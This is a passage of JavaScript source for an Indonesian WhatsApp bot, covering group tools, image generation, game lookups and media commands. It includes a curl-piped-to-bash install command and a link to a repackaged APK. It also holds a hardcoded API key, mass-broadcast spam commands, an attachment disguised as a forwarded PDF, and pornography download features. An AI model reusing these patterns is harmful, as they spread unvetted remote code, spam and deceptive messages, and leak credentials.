                    `*Total Member:* ${metadata.participants.length}\n` +
                    `*Jumlah Admin:* ${adminCount}`
    conn.sendMessage(m.chat, {
      image: { url: groupPP },
      caption
    }, { quoted: m })
  } catch (e) {
    console.error(e)
    m.reply('Gagal ambil info grup.')
  }
}
break
case "delidch": case "delch": {
if (!isCreator) return Reply(mess.owner)
if (listidch.length < 1) return m.reply("Tidak ada id channel di database")
if (!text) return m.reply(example("idchnya"))
if (text.toLowerCase() == "all") {
listidch.splice(0, listidch.length)
await fs.writeFileSync("./library/database/listidch.json", JSON.stringify(listidch))
return m.reply(`Berhasil menghapus semua id channel dari database ✅`)
}
if (!text.endsWith("@newsletter")) return m.reply("Id channel tidak valid")
let input = text
if (!listidch.includes(input)) return m.reply(`Id ${input2} tidak terdaftar!`)
const pos = listidch.indexOf(input)
listidch.splice(pos, 1)
await fs.writeFileSync("./library/database/listidch.json", JSON.stringify(listidch, null, 2))
m.reply(`Berhasil menghapus id channel dari database ✅`)
}
break

case "listidch": case "listch": {
if (listidch.length < 1) return m.reply("Tidak ada id channel di database")
let teks = ` *── List all id channel*\n`
for (let i of listidch) {
teks += `\n* ${i}\n`
}
conn.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

case "addidch": case "addch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idchnya"))
if (!text.endsWith("@newsletter")) return m.reply("Id channel tidak valid")
let input = text
if (listidch.includes(input)) return m.reply(`Id ${input2} sudah terdaftar!`)
listidch.push(input)
await fs.writeFileSync("./library/database/listidch.json", JSON.stringify(listidch, null, 2))
m.reply(`Berhasil menambah id channel kedalam database ✅`)
}
break

case "cekkhodam": case "cekkodam": {
  if (!text) return m.reply('❌ Masukkan nama untuk mengecek khodam.');
  m.reply(mess.wait);
  const axios = require('axios');
  let apiUrl = `https://nirkyy.koyeb.app/api/v1/khodam?nama=${encodeURIComponent(text)}`;
  try {
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    conn.sendMessage(m.chat, {
      image: Buffer.from(response.data),
      caption: `🔮 *Hasil Cek Khodam* 🔮\n\n📌 *Nama:* ${text}`
    }, { quoted: m });
  } catch (error) {
    console.log(error);
    m.reply(`❌ Error\nLogs error : ${error.message}`);
  }
}
break

case "colorize": {
    if (!/image/.test(mime)) return m.reply("Kirim atau reply gambar dengan caption *.colorize*");

    let media = await conn.downloadAndSaveMediaMessage(qmsg);
    const { ImageUploadService } = require('node-upload-images');
    const service = new ImageUploadService('pixhost.to');

    try {
        const { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'biyuofficial.png');
        const res = await fetch(`https://api.ryzendesu.vip/api/ai/colorize?url=${directLink}`);
        if (!res.ok || !res.headers.get('content-type')?.startsWith('image/')) {
            return m.reply("❌ Gagal: Respons bukan gambar atau server error.");
        }
        const hasil = await res.buffer();
        await conn.sendMessage(m.chat, { image: hasil, caption: "✅ Berhasil diwarnai!" }, { quoted: m });
    } catch (err) {
        console.error(err);
        m.reply("❌ Terjadi kesalahan saat proses colorize.");
    } finally {
        await fs.unlinkSync(media);
    }
}
break

case "jpmch": case "jpmallch": {
if (!isCreator) return Reply(mess.owner)
if (listidch.length < 1) return m.reply("Tidak ada id ch didalam database")
if (!q) return m.reply(example("teksnya bisa dengan kirim foto juga"))
let rest
if (/image/.test(mime)) {
rest = await conn.downloadAndSaveMediaMessage(qmsg)
}
const allgrup = listidch
const res = allgrup
let count = 0
const ttks = text
const pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks } : { text: ttks }
const opsijpm = rest !== undefined ? "teks & foto" : "teks"
const jid = m.chat
await m.reply(`Memproses jpmch *${opsijpm}* ke ${res.length} channel`)
for (let i of res) {
try {
await conn.sendMessage(i, pesancoy)
count += 1
} catch {}
await sleep(global.delayJpm)
}
if (rest !== undefined) await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `Jpmch *${opsijpm}* berhasil dikirim ke ${count} channel`}, {quoted: m})
}
break

case "npm": case "npmsearch": {
if (!text) return m.reply(example('axios'))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await fetchJson(`https://restapi-v2.simplebot.my.id/search/npm?q=${text}`)
const anuan = ytsSearch.result
let teks = "\n"
for (let res of anuan) {
teks += `* ${res.title}
* ${res.update.split("T")[0]}
* ${res.links.npm}\n\n`
}
await m.reply(teks)
}
break

case "searchhero": 
case "shero": {
 (async () => {
 try {
 if (!args || !argsbiyuoffc[0]) {
 m.reply("Error: Please provide a hero name to search. Example: .shero Nana");
 return;
 }
 const heroName = argsbiyuoffc[0];
 const apiUrl = `https://api.vreden.my.id/api/hero?query=${encodeURIComponent(heroName)}`;
 const response = await fetch(apiUrl);
 if (!response.ok) {
 m.reply(`Error: API request failed with status ${response.status}`);
 return;
 }
 const data = await response.json();
 if (data.status === 200 && data.result) {
 const hero = data.result;
 let voiceActors = '';
 const languages = ['English', 'Japanese', 'Indonesian', 'Arabic', 'Portuguese', 'Russian', 'Turkish', 'Spanish', 'Chinese'];
 
 languages.forEach(lang => {
 if (hero.story_info_list[lang]) {
 voiceActors += `\n• ${lang}: ${hero.story_info_list[lang]}`;
 }
 });
 
 if (voiceActors) {
 voiceActors = '\n\n*Voice Actors:*' + voiceActors;
 }
 const gameplayInfo = hero.gameplay_info ? 
 `\n\n*Gameplay Info:*\n` +
 `• Durability: ${hero.gameplay_info.durability || 'N/A'}\n` +
 `• Offense: ${hero.gameplay_info.offense || 'N/A'}\n` +
 `• Control Effect: ${hero.gameplay_info.control_effect || 'N/A'}\n` +
 `• Difficulty: ${hero.gameplay_info.difficulty || 'N/A'}`
 : '';
 const heroDetail = `*「 HERO SEARCH: ${heroName} 」*\n\n` +
 `*Alias:* ${hero.story_info_list.Alias || 'N/A'}\n` +
 `*Internal Name:* ${hero.story_info_list['Internal name'] || 'N/A'}\n` +
 `*Release Year:* ${hero.release || 'N/A'}\n` +
 `*Role:* ${hero.role || 'N/A'}\n` +
 `*Specialty:* ${hero.specialty || 'N/A'}\n` +
 `*Lane:* ${hero.lane || 'N/A'}\n` +
 `*Price:* ${hero.price || 'N/A'}\n\n` +
 
 `*Personal Info:*\n` +
 `• Birthday: ${hero.story_info_list.Birthday || 'N/A'}\n` +
 `• Born: ${hero.story_info_list.Born || 'N/A'}\n` +
 `• Age: ${hero.story_info_list.Age || 'N/A'}\n` +
 `• Gender: ${hero.story_info_list.Gender || 'N/A'}\n` +
 `• Species: ${hero.story_info_list.Species || 'N/A'}\n\n` +
 
 `*Abilities:*\n` +
 `• Weapons: ${hero.story_info_list.Weapons || 'N/A'}\n` +
 `• Skills: ${hero.story_info_list.Abilities || 'N/A'}` +
 gameplayInfo +
 voiceActors +
 `\n\n`;
 
 await conn.sendMessage(m.chat, {
 image: { url: hero.hero_img },
 caption: heroDetail
 }, { quoted: m });
 } else {
 m.reply(`Error: Failed to find hero "${heroName}". Hero might not exist or API error occurred.`);
 }
 } catch (error) {
 m.reply(`Error: ${error.message}`);
 }
 })();
}
break
    
    case "listhero":
    (async () => {
      try {
        const response = await fetch("https://api.vreden.my.id/api/search/listhero");
        if (!response.ok) {
          reply(`Error: API request failed with status ${response.status}`);
          return;
        }
        const data = await response.json();
        if (data.status === 200 && Array.isArray(data.result)) {
          let heroList = '';
          data.result.forEach((hero, index) => {
            heroList += `${index + 1}. ${hero.name} - ${hero.slogan}\n`;
            heroList += `   Role: ${hero.role} | Lane: ${hero.laning}\n`;
            heroList += `   Region: ${hero.region} | Price: ${hero.pointsBP} BP / ${hero.pointsDM} DM\n\n`;
          });
          m.reply(`*「 MOBILE LEGENDS HERO LIST 」*\n\n${heroList}\n*Total Heroes: ${data.result.length}*\n\nData from: api.vreden.my.id`);
        } else {
          m.reply("Error: Failed to get hero data from API");
        }
      } catch (error) {
        m.reply(`Error: ${error.message}`);
      }
    })();
    break
    
case "herodetail": 
case "detailhero": {
    (async () => {
      try {
        if (!args || !argsbiyuoffc[0]) {
          m.reply("Error: Please provide a hero name. Example: .herodetail Balmond");
          return;
        }
        const heroName = argsbiyuoffc[0];
        const apiUrl = `https://api.vreden.my.id/api/search/herodetail?url=https://mobile-legends.fandom.com/wiki/${encodeURIComponent(heroName)}`;
        const response = await fetch(apiUrl);
        if (!response.ok) {
          m.reply(`Error: API request failed with status ${response.status}`);
          return;
        }
        const data = await response.json();
        if (data.status === 200 && data.result) {
          const hero = data.result;
          let voicedBy = '';
          if (hero.voiced_by) {
            voicedBy = '\n*Voiced By:*';
            for (const [language, actor] of Object.entries(hero.voiced_by)) {
              voicedBy += `\n• ${language.charAt(0).toUpperCase() + language.slice(1)}: ${actor}`;
            }
          }
          const heroDetail = `*「 HERO DETAIL: ${hero.name} 」*\n\n` +
            `*Name:* ${hero.name}\n` +
            `*Alias:* ${hero.alias || 'N/A'}\n` +
            `*Internal Name:* ${hero.internal_name || 'N/A'}\n` +
            `*Birthday:* ${hero.birthday || 'N/A'}\n` +
            `*Gender:* ${hero.gender || 'N/A'}\n` +
            `*Species:* ${hero.species || 'N/A'}\n` +
            `*Occupation:* ${hero.occupation || 'N/A'}\n` +
            `*Affiliation:* ${hero.affiliation || 'N/A'}\n` +
            `*Weapons:* ${hero.weapons || 'N/A'}\n` +
            `*Abilities:* ${hero.abilities || 'N/A'}\n` +
            `*Website:* ${hero.website || 'N/A'}` +
            `${voicedBy}`;
          
          await conn.sendMessage(m.chat, {
            image: { url: hero.image },
            caption: heroDetail
          }, { quoted: m });
        } else {
          m.reply(`Error: Failed to get detail for hero "${heroName}". Hero might not exist or API error occurred.`);
        }
      } catch (error) {
        m.reply(`Error: ${error.message}`);
      }
    })();
    }
    break
    
case "emojigif": {
if (!text) return m.reply(example('😍'))
try {
const axios = require('axios');
let brat = `https://restapi-v2.simplebot.my.id/tools/emojitogif?emoji=${encodeURIComponent(text)}`;
let response = await axios.get(brat, { responseType: "arraybuffer" });
let videoBuffer = response.data;
let stickerBuffer = await conn.sendAsSticker(m.chat, videoBuffer, m, {
packname: global.packname,
})
} catch (err) {
console.error("Error:", err);
}
}
break

case "emojimix": {
if (!text) return m.reply(example('😀|😍'))
if (!text.split("|")) return m.reply(example('😀|😍'))
let [e1, e2] = text.split("|")
let brat = `https://restapi-v2.simplebot.my.id/tools/emojimix?emoji1=${encodeURIComponent(e1)}&emoji2=${encodeURIComponent(e2)}`
let videoBuffer = await getBuffer(brat)
try {
await conn.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {}
}
break

case 'ttp': case 'attp':
  if (argsbiyuoffc.length == 0) return m.reply(`Example: ${prefix + command} Biyu`);
  ini_txt = argsbiyuoffc.join(" ");
  ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/attp?apikey=a8e86232771f9bc1826742c1&text=${ini_txt}`);
  await conn.sendAsSticker(m.chat, ini_buffer, m, {
    packname: global.packname,
    author: global.author,
  });
break

case 'antilinkall': {
  if (!m.isGroup) return m.reply('Fitur ini cuma bisa dipakai di grup!');
    if (!m.isBotAdmin) return m.reply(mess.botAdmin)
  if (!antilinkall[m.chat]) antilinkall[m.chat] = { active: false, warnings: {}, antilink: false }
  const argsLower = q.toLowerCase();
  if (argsLower === 'on') {
    antilinkall[m.chat].antilink = true;
    saveantilinkAll();
    m.reply('✅ Anti Link All AKTIF!');
  } else if (argsLower === 'off') {
    antilinkall[m.chat].antilink = false;
    saveantilinkAll();
    m.reply('❌ Anti Link All NONAKTIF!');
  } else {
    m.reply(`Contoh:\n*${prefix}antilinkall on*\n*${prefix}antilink off*`);
  }
}
break

case "ssong": case "searchsoundcloud": case "searchsong": {
    if (!text) return m.reply("Example: .ssong Lathi");
    m.reply("Searching for songs on SoundCloud...");

    try {
        const query = encodeURIComponent(text);
        const response = await fetch(`https://archive-ui.tanakadomp.biz.id/search/soundcloud?q=${query}`);
        const data = await response.json();

        if (!data.status || !data.result || data.result.length === 0) {
            return m.reply("No songs found. Try a different search term.");
        }

        let teks = `🎵 *SOUNDCLOUD SEARCH RESULTS*\n\n`;
        
        const songs = data.result.slice(0, 15);
        
        songs.forEach((song, i) => {
            teks += `*${i+1}.* ${song.title || "Unknown Title"}\n`;
            teks += `👤 *Artist:* ${song.artist || "Unknown Artist"}\n`;
            teks += `⏱️ *Duration:* ${song.duration || "Unknown"}\n`;
            teks += `📊 *Plays:* ${song.plays || "Unknown"}\n`;
            teks += `🔗 *URL:* ${song.url || "No URL available"}\n\n`;
        });

        teks += `To download a song, use: ${prefix}scdl [URL]`;
        conn.sendMessage(m.chat, { text: teks }, { quoted: m });

    } catch (error) {
        console.log(error);

        try {
            m.reply("Primary search failed. Trying backup method...");

            const fetchResponse = await fetch(`https://m.soundcloud.com/search?q=${encodeURIComponent(text)}`);
            const html = await fetchResponse.text();

            const urlRegex = /https:\/\/soundcloud\.com\/([^"]+)/g;
            const titleRegex = /<h2[^>]*>(.*?)<\/h2>/g;
            
            const urls = [...html.matchAll(urlRegex)].map(match => match[0]).filter(url => 
                !url.includes('/tags/') && !url.includes('/discover') && 
                !url.includes('/stream') && !url.includes('/upload')
            );
            
            const titles = [...html.matchAll(titleRegex)].map(match => match[1]);
            
            if (urls.length === 0) {
                return m.reply("No songs found with backup method. Try a different search term.");
            }
            
            let teks = `🎵 *SOUNDCLOUD SEARCH RESULTS (BASIC)*\n\n`;
          
            const limit = Math.min(10, urls.length);
            
            for (let i = 0; i < limit; i++) {
                teks += `*${i+1}.* ${titles[i] || `Track ${i+1}`}\n`;
                teks += `🔗 *URL:* ${urls[i]}\n\n`;
            }
            
            teks += `To download a song, use: ${prefix}scdl [URL]`;
            conn.sendMessage(m.chat, { text: teks }, { quoted: m });
            
        } catch (fallbackError) {
            console.log(fallbackError);
            m.reply("Error searching for songs. Please try again later or check if SoundCloud is accessible.");
        }
    }
}
break

case "magic": case "magicimg": case "magicstudio": case "cgambar": case "cimg": {
  if (!text) {
    return m.reply('Masukkan teks yang ingin dijadikan gambar!');
  }
  try {
    m.reply('_Sedang Memproses Gambar..._');
    let apiUrl = `https://velyn.biz.id/api/ai/magicStudio?prompt=${encodeURIComponent(text)}&apikey=velyn`;
    let response = await fetch(apiUrl);
    let buffer = await response.buffer();
    await conn.sendMessage(m.chat, { image: buffer, caption: '*Ini hasil gambarnya kak :v*\n\n> Maaf jika tidak sesuai harapan 😔' }, { quoted: m });
  } catch (error) {
    console.error('Error in MagicStudii:', error);
    m.reply('Terjadi kesalahan saat memproses gambar');
  }
}
break
case 'flux-v2':
case 'fluximg2': {
 if (!q) return m.reply("Masukkan prompt!\nContoh: flux cewek cantik duduk di taman");

 const isValid = typeof q === "string" && q.trim().length > 0;
 if (!isValid) return m.reply("Prompt tidak valid.");

 try {
 const axios = require('axios');
 const { data } = await axios.post("https://fluxai.pro/api/tools/fast", {
 prompt: q
 }, {
 headers: {
 "Content-Type": "application/json",
 "User-Agent": "Mozilla/5.0 (compatible; FluxAI-Client/1.0)",
 "Accept": "application/json"
 }
 });

 if (!data || !data.data || !data.data.imageUrl) {
 return m.reply("Gagal mengambil gambar dari API.");
 }

 const imageUrl = data.data.imageUrl;
 conn.sendMessage(m.chat, { image: { url: imageUrl }, caption: `Hasil untuk: ${q}` }, { quoted: m });
 
 } catch (err) {
 console.error("Gagal melakukan permintaan:", err.message);
 m.reply("Terjadi kesalahan saat memproses permintaan.");
 }
}
break
case "texttoimage": case "flux": case "fluximg": case "createimage": case "bikin gambar": case "timg": {
  if (!text) {
    return m.reply('Masukkan teks yang ingin dijadikan gambar!');
  }
  try {
    m.reply('_Sedang Memproses Gambar..._');
    let apiUrl = `https://api.rynn-archive.biz.id/ai/flux-schnell?text=${encodeURIComponent(text)}`;
    let response = await fetch(apiUrl);
    let buffer = await response.buffer();
    await conn.sendMessage(m.chat, { image: buffer, caption: '*Ini hasil gambarnya kak :v*\n\n> Maaf jika tidak sesuai harapan 😔' }, { quoted: m });
  } catch (error) {
    console.error('Error in flux:', error);
    m.reply('Terjadi kesalahan saat memproses gambar');
  }
}
break
case "tutor": case "tutorial":
    let menu = `* 1. Tutorial Memasang Egg di Panel Pterodactyl:
    *Video Tutorial:* https://youtu.be/qcfM3_99kNs?si=1dFgQUvcFz1OtNz7
    > Menjelaskan langkah-langkah untuk mengimpor egg ke dalam panel Pterodactyl, yang memungkinkan Anda menjalankan berbagai game server.

    *BAHAN:*
    > Egg Bot WhatsApp: https://www.mediafire.com/file/ezrpaa1ggaf8htq/egg.botwa-terbaru.json/file

    * 2. Tutorial Membuat Pengguna dan Server di Panel Pterodactyl:
    *Video Tutorial:* https://youtu.be/dSLMu-AuyIU?si=2G261b5u-R4Dsy86
    > Menunjukkan cara menambahkan pengguna baru ke panel Pterodactyl dan memberikan akses ke server yang sudah dibuat.

    *BAHAN:*
    > Akun Untuk Akses Panel Pterodactyl

    * 3. Tutorial Login ke VPS melalui JuiceSSH:
    *Video Tutorial:* https://youtu.be/nhiZep7t4cQ?si=BAX3Vvqn8xcJ9ybr
    > Video ini menunjukkan login VPS menggunakan JuiceSSH untuk terhubung ke server Linux melalui SSH dari perangkat Android Anda.

    *BAHAN:*
    > Aplikasi JuiceSSH: https://www.mediafire.com/file/fjcm1vwxejrmzoo/JuiceSSH_%255B_BIYU_%255D.apk/file

    > Command Saat Login Vps Melalui JuiceSSH: bash <(curl -s https://pterodactyl-installer.se)

    * 4. Tutorial Menghapus Pengguna dan Server di Panel Pterodactyl:
    *Video Tutorial:* https://youtu.be/nwq440yCJJw?si=4dYaVoaO7lcNei8p
    > Video ini memberikan panduan lengkap tentang cara menghapus server dan pengguna di panel Pterodactyl.

    *BAHAN:*
    > Akun Untuk Akses Panel Pterodactyl

    © Copyright Biyu Official 
    *JANGAN DIHAPUS!!*`;

    conn.sendMessage(m.chat, {
        document: fs.readFileSync("./package.json"),
        fileName: `${global.namaOwner}`,
        mimetype: "application/pdf",
        fileLength: 0,
        pageCount: 0,
        caption: menu,
        mentions: [m.sender],
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            mentionedJid: [m.sender],
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                newsletterName: global.namaSaluran
            },
            externalAdReply: {
                title: `Powered By ${global.namaOwner}`,
                body: "Botz Biyu Offc",
                thumbnailUrl: global.image.menu,
                sourceUrl: global.linkSaluran,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, {
        quoted: m
    });
    break
case "xnxxdown": 
case "downxnxx":{
    if (!q) return m.reply(`Example: ${prefix + command} URL`);
    m.reply(mess.wait);
    const axios = require('axios');
    try {
        const apiUrl = `https://restapi-v2.simplebot.my.id/download/xnxx?url=${q}`;
        const { data } = await axios.get(apiUrl);
        
        if (!data.status) return m.reply("Failed to fetch video data");
        
        const result = data.result;
        
        let caption = `*XNXX DOWNLOADER*\n\n`;
        caption += `*Title:* ${result.title}\n`;
        caption += `*Duration:* ${result.duration} seconds\n`;
        caption += `*Info:* ${result.info.trim()}\n`;
        caption += `*URL:* ${result.URL}\n\n`;
        caption += `_Sending video, please wait..._`;
        
        await conn.sendMessage(m.chat, { 
            image: { url: result.image }, 
            caption: caption 
        }, { quoted: m });
        
        await conn.sendMessage(m.chat, { 
            video: { url: result.files.high }, 
            caption: `*High Quality*\n${result.title}`,
            fileName: `${result.title}.mp4`
        }, { quoted: m });
        
        await conn.sendMessage(m.chat, { 
            video: { url: result.files.low }, 
            caption: `*Low Quality*\n${result.title}`,
            fileName: `${result.title}-low.mp4`
        }, { quoted: m });
    } catch (error) {
        console.error(error);
        m.reply(`Error: ${error.message}`);
    }
    }
    break
    
case "smess": case "sendgb": case "sendgc": {
 if (!isCreator) return Reply(mess.owner)
 if (!q) return m.reply(example("idgc|teksnya"))
 if (!q.includes('|')) return m.reply(example("idgc|teksnya"))
 const [targetGc, message] = q.split('|')
 const teks = message.trim()
 if (!targetGc || !teks) return m.reply(example("idgc|teksnya"))
 await m.reply(`Memproses *Smess* teks ke grup dengan ID: ${targetGc}`)
 try {
 if (global.db.groups[targetGc] && global.db.groups[targetGc].blacklistjpm && global.db.groups[targetGc].blacklistjpm == true) {
 return m.reply(`Grup dengan ID ${targetGc} dalam blacklist JPM`)
 }
 await conn.sendMessage(targetGc, {text: teks}, {quoted: qlocJpm})
 await conn.sendMessage(m.chat, {text: `*Smess Telah Selesai ✅*\nBerhasil mengirim pesan ke grup dengan ID: ${targetGc}`}, {quoted: m})
 } catch (error) {
 await conn.sendMessage(m.chat, {text: `*Jpm Gagal ❌*\nTidak dapat mengirim pesan ke grup dengan ID: ${targetGc}\nError: ${error.message}`}, {quoted: m})
 }
}
break

case "smess2": case "sendgb2": case "sendgc2": {
 if (!isCreator) return Reply(mess.owner)
 if (!q) return m.reply(example("idgc|teks dengan reply foto"))
 if (!/image/.test(mime)) return m.reply(example("idgc|teks dengan mengirim foto"))
 if (!q.includes('|')) return m.reply(example("idgc|teks dengan mengirim foto"))
 const [targetGc, message] = q.split('|')
 const teks = message.trim()
 if (!targetGc || !teks) return m.reply(example("idgc|teks dengan mengirim foto"))
 const jid = m.chat
 const rest = await conn.downloadAndSaveMediaMessage(qmsg)
 await m.reply(`Memproses *Smess2* teks & foto ke grup dengan ID: ${targetGc}`)
 try {
 if (global.db.groups[targetGc] && global.db.groups[targetGc].blacklistjpm && global.db.groups[targetGc].blacklistjpm == true) {
 await fs.unlinkSync(rest)
 return m.reply(`Grup dengan ID ${targetGc} dalam blacklist JPM`)
 }
 await conn.sendMessage(targetGc, {
 image: await fs.readFileSync(rest), 
 caption: teks, 
 contextInfo: { 
 isForwarded: true, 
 mentionedJid: [m.sender], 
 businessMessageForwardInfo: { 
 businessOwnerJid: global.owner+"@s.whatsapp.net" 
 }, 
 forwardedNewsletterMessageInfo: { 
 newsletterName: global.namaSaluran, 
 newsletterJid: global.idSaluran 
 }
 }
 }, {quoted: qlocJpm})
 await fs.unlinkSync(rest)
 await conn.sendMessage(jid, {text: `*Smess2 Telah Selesai ✅*\nBerhasil mengirim pesan dengan foto ke grup dengan ID: ${targetGc}`}, {quoted: m})
 } catch (error) {
 await fs.unlinkSync(rest)
 await conn.sendMessage(jid, {text: `*Jpm2 Gagal ❌*\nTidak dapat mengirim pesan ke grup dengan ID: ${targetGc}\nError: ${error.message}`}, {quoted: m})
 }
}
break

case "searchxnxx": 
case "sxnxx":{
    if (!q) return m.reply(`Example: ${prefix + command} anime`);
    m.reply(mess.wait);
const axios = require('axios');    
    try {
        const apiUrl = `https://restapi-v2.simplebot.my.id/search/xnxx?q=${encodeURIComponent(q)}`;
        const { data } = await axios.get(apiUrl);
        
        if (!data.status) return m.reply("Failed to fetch search results");
        
        let resultText = `*XNXX SEARCH RESULTS*\n`;
        resultText += `*Query:* ${q}\n`;
        resultText += `*Found:* ${data.result.length} videos\n\n`;
        
        const maxResults = 10;
        const displayResults = data.result.slice(0, maxResults);
        
        displayResults.forEach((video, index) => {
            resultText += `*${index + 1}. ${video.title}*\n`;
            resultText += `Info: ${video.info.trim()}\n`;
            resultText += `Link: ${video.link}\n\n`;
        });
        
        if (data.result.length > maxResults) {
            resultText += `_And ${data.result.length - maxResults} more results..._\n`;
            resultText += `_Use ${prefix}xnxxdown [link] to download any video_`;
        }
        
        await conn.sendMessage(m.chat, {
            text: resultText
        }, { quoted: m });
        
    } catch (error) {
        console.error(error);
        m.reply(`Error: ${error.message}`);
    }
    }
    break
case 'downloadurl': case 'down': {
    if (!text) return m.reply('Mana URL-nya bang?\n\nContoh:\n.downloadurl https://example.com/file.png');
    const fetch = require('node-fetch');
    try {
        const res = await fetch(text);
        if (!res.ok) throw new Error(`Gagal download, status ${res.status}`);
        const buffer = await res.buffer();
        const contentType = res.headers.get('content-type') || '';
        const fileName = `file.${contentType.split('/')[1] || 'bin'}`;
        if (/image/.test(contentType)) {
            await conn.sendMessage(m.chat, {
                image: buffer,
                fileName,
                caption: 'Berikut hasil download image:'
            }, { quoted: m });
        } else if (/video/.test(contentType)) {
            await conn.sendMessage(m.chat, {
                video: buffer,
                fileName,
                caption: 'Berikut hasil download video:'
            }, { quoted: m });
        } else {
            await conn.sendMessage(m.chat, {
                document: buffer,
                fileName,
                mimetype: contentType,
                caption: 'Berikut hasil download dokumen:'
            }, { quoted: m });
        }
    } catch (e) {
        console.error(e);
        m.reply(`[ ! ] Gagal download file.\n\nError: ${e.message}`);
    }
};
break    
case 'tagsw': {
    if (!isOwner) return m.reply('Khusus Owner');
    
    let [id, ...teksArray] = text.split(' ');
    let teks = teksArray.join(' ');

    if (!id || !teks) {
        return m.reply(`Example: .tagsw <group_id> Hello\n\n> Note : reply media,jika tidak ada media maka status akan teks saja`);
    }

    let mediaContent = null;
    let msgOptions = {};
    const BackgroundColor = ['#f68ac9', '#6cace4', '#f44336', '#4caf50', '#ffeb3b', '#9c27b0', '#0d47a1', '#03a9f4', '#9e9e9e', '#ff9800', '#000000', '#ffffff', '#008080', '#FFC0CB', '#A52A2A', '#FFA07A', '#FF00FF', '#D2B48C', '#F5DEB3', '#FF1493', '#B22222', '#00BFFF', '#1E90FF', '#FF69B4', '#87CEEB', '#20B2AA', '#8B0000', '#FF4500', '#48D1CC', '#BA55D3', '#00FF7F', '#008000', '#191970', '#FF8C00', '#9400D3', '#FF00FF', '#8B008B', '#2F4F4F', '#FFDAB9', '#BDB76B', '#DC143C', '#DAA520', '#696969', '#483D8B', '#FFD700', '#C0C0C0'];
    const pickedColor = BackgroundColor[Math.floor(Math.random() * BackgroundColor.length)];
    const jids = [m.sender, id];

    if (quoted) {
        const mime = quoted.mtype || quoted.mediaType;
        if (mime?.includes('image')) {
            mediaContent = await m.quoted.download();
            msgOptions = {
                image: mediaContent,
                caption: teks || m.quoted.text || '',
            };
        } else if (mime?.includes('video')) {
            mediaContent = await m.quoted.download();
            msgOptions = {
                video: mediaContent,
                caption: teks || m.quoted.text || '',
            };
        } else {
            msgOptions = {
                text: teks || m.quoted.text || '',
            };
        }
    } else {
        msgOptions = {
            text: teks,
        };
    }

    await conn.sendMessage("status@broadcast", msgOptions, {
        backgroundColor: pickedColor,
        textArgb: 0xffffffff,
        font: 0,
        statusJidList: await (await conn.groupMetadata(id)).participants.map((a) => a.id),
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: jids.map((jid) => ({
                            tag: "to",
                            attrs: { jid: id },
                            content: undefined,
                        })),
                    },
                ],
            },
        ],
    });
    m.reply("Udh Kekirim\ncek status aja 😌");
}
break
case 'to': {
  if (argsbiyuoffc.length === 0) {
    let stylesList = `
Available Styles:
20. Crayon
21. Ink Stains
22. Simple Drawing
23. Witty
24. Tinies
25. Grumpy 3D
26. 90s Shoujo Manga
29. Gothic
32. Vector
33. Comic Book
35. Felted Doll
36. Wojak
37. Illustration
38. Mini
39. Clay
40. 3D
41. Ink Painting
42. Color Rough

Silakan pilih style dengan mengetikkan kode style (misalnya: "to 20" untuk Crayon).
`;
    await conn.sendMessage(m.chat, { text: stylesList }, { quoted: m });
    return;
  }
  if (m.quoted) {
      const { ImageUploadService } = require('node-upload-images')
    let media = await conn.downloadAndSaveMediaMessage(m.quoted);
    const service = new ImageUploadService('pixhost.to');
    let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'biyu.jpg');
    let img = directLink.toString();
    let styleCode = argsbiyuoffc[0];  
    const availableStyles = {
      "20": "Crayon",
      "21": "Ink Stains",
      "22": "Simple Drawing",
      "23": "Witty",
      "24": "Tinies",
      "25": "Grumpy 3D",
      "26": "90s Shoujo Manga",
      "29": "Gothic",
      "32": "Vector",
      "33": "Comic Book",
      "35": "Felted Doll",
      "36": "Wojak",
      "37": "Illustration",
      "38": "Mini",
      "39": "Clay",
      "40": "3D",
      "41": "Ink Painting",
      "42": "Color Rough"
    };
    if (!availableStyles[styleCode]) {
      await conn.sendMessage(m.chat, { text: 'Kode style tidak ditemukan. Ketik "to" untuk melihat daftar style yang tersedia.' }, { quoted: m });
      return;
    }
    const response = await fetch(`https://fastrestapis.fasturl.cloud/imgedit/toanimation?imageUrl=${img}&style=${styleCode}`);
    const result = await response.buffer();  
    await conn.sendMessage(m.chat, { image: result, caption: `Gambar telah diubah menjadi animasi dengan style: ${availableStyles[styleCode]}\n\n> kennzy` }, { quoted: m });
  }
  }
  break
case 'bigjpg':
case 'upscale': {
  const fs = require('fs');
  const axios = require('axios');
  const { ImageUploadService } = require('node-upload-images');
const qmsg = m.quoted ? m.quoted : m;
const mime = (qmsg.msg || qmsg).mimetype || '';
if (!/image/.test(mime)) {
  return m.reply('Reply gambar yang mau di-upscale dulu bree 🗿\n\nNote: tanpa style dan noise gpp, kamu reply aja\n\n.upscale style,noise\nContoh: .upscale photo,2\n\nPilihan Style yang Valid:\nart → untuk gambar seni/ilustrasi\nphoto → untuk foto asli\n\nPilihan Noise Reduction Level:\n-1 → Ninguno (tanpa pengurangan noise)\n0 → Bajo (rendah)\n1 → Medio (sedang)\n2 → Alto (tinggi)\n3 → El más alto (tertinggi)');
}
  let style = (q.split(',')[0] || 'art').toLowerCase().trim();
  let noise = (q.split(',')[1] || '-1').trim();

  let availableStyles = {
    'art': 'Artwork',
    'photo': 'Foto'
  };
  let availableNoise = {
    '-1': 'Ninguno',
    '0': 'Bajo',
    '1': 'Medio',
    '2': 'Alto',
    '3': 'El más alto'
  };

  if (!availableStyles[style]) {
    return m.reply(`Stylenya kagak valid bree.. Pilih: ${Object.keys(availableStyles).join(', ')}`);
  }
  if (!availableNoise[noise]) {
    return m.reply(`Noise levelnya kagak valid bree.. Pilih: ${Object.keys(availableNoise).join(', ')}`);
  }

  let media = await conn.downloadAndSaveMediaMessage(m.quoted);
  const service = new ImageUploadService('pixhost.to');
